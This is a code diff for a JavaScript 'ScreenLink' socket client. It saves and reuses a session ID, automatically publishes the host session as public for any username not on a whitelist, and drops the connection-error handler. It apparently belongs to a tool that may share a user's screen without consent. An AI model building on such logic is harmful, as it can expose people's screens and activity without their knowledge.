@@ -18,27 +18,45 @@ if (WHITELIST.includes(USERNAME)) {
     return
 } else {
 
+const SESSION_KEY = "screenlink_session";
+
+let sessionId = localStorage.getItem(SESSION_KEY);
+
 socket.on("connect", () => {
     console.log("Connected to ScreenLink:", socket.id);
 
-    socket.emit("host:create");
+    if (sessionId) {
+        console.log("Reconnecting to existing session:", sessionId);
 
-    socket.once("host:code", ({ code, expiresIn, hasPassword }) => {
-        console.log("Host code:", code);
-        console.log("Expires in:", expiresIn);
-        console.log("Has password:", hasPassword);
-
-        socket.emit("host:set-public", {
-            isPublic: true,
-            label: "User"
+        socket.emit("host:join", {
+            sessionId
         });
+
+        return;
+    }
+
+    console.log("Creating new ScreenLink session...");
+
+    socket.emit("host:create");
+});
+
+socket.on("host:code", ({ code, expiresIn, hasPassword, sessionId: newSessionId }) => {
+    console.log("Host code:", code);
+    console.log("Expires in:", expiresIn);
+    console.log("Has password:", hasPassword);
+
+    if (newSessionId) {
+        localStorage.setItem(SESSION_KEY, newSessionId);
+        sessionId = newSessionId;
+
+        console.log("Saved ScreenLink session:", newSessionId);
+    }
+
+    socket.emit("host:set-public", {
+        isPublic: true,
+        label: "User"
     });
 });
-
-socket.on("connect_error", error => {
-    console.error("ScreenLink connection error:", error);
-});
-
 
 // ============================================================
 // URL OPENING
